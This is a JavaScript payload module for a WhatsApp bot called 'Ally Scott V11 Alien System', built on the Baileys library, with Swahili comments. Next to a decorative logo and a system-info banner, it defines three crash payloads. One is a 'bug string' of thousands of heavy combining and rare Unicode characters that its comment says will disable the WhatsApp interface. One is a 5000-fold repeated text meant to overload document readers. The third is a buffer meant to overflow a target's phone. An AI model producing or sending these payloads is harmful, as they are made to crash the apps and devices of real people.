/**
 * ALLY SCOTT V11 - ALIEN SYSTEM
 * Dark Arsenal Payloads - PRO VERSION
 */

const payloads = {
    // Logo ya kinyama inayotokea ukipiga .alienscott
    alien_logo: `
    .      .       .       .
      .      .      👽      .
    .    ALLY SCOTT V11    .
      .   ALIEN SYSTEM   .
    .      .       .       .`,
    
    // Maelezo ya mfumo kwa ajili ya .system
    system_info: `🛸 *ALIEN PROTOCOL ACTIVE*
🛰️ *Server:* Render (High-Speed)
🤖 *Engine:* Baileys v6.6.0
🔋 *RAM Usage:* Optimized
📡 *Network:* Secure Encryption
👤 *Developer:* Ally Scott`,

    // Nguvu ya kutosha kulemaza WhatsApp UI kirahisi (Bug String)
    crashPayload: (function() {
        let str = "☣️ *ALLY SCOTT CRASH* ☣️\n";
        let heavy = "҈".repeat(400) + "⡈".repeat(400) + "ᚙ".repeat(400) + "𝀛".repeat(400);
        for (let i = 0; i < 40; i++) {
            str += heavy + "\n";
        }
        return str;
    })(),

    // Payload kwa ajili ya kulemaza Document reader
    docPayload: "📂 SYSTEM OVERLOAD 📂".repeat(5000),

    // Inatumika kulemaza buffer ya simu za target
    overflow: Buffer.alloc(1024 * 5, '👾').toString()
};

module.exports = payloads;
